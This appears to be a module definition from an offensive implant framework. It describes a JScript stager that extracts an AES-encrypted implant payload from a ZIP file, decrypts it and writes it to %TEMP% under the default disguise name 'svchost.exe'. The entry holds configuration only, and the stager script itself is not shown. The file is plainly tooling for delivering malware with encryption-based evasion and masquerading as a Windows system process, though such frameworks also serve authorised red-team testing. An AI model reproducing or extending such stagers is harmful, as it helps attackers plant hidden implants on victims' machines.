({
    name:        "JScript ZIP-Embedded Stager",
    description: "Extracts and decrypts implant payload from ZIP container, no EXE stager needed",
    type:        "stager",
    format:      "jscript",
    template:    "stager.js",
    variables: {
        KEY_B64:  { description: "AES-256 key, base64-encoded", required: true },
        IV_B64:   { description: "AES IV, base64-encoded", required: true },
        FILENAME: { description: "Filename to write in %TEMP%", default: "svchost.exe" },
        MAGIC:    { description: "Payload marker in ZIP", default: "THORNPLD" },
    },
})
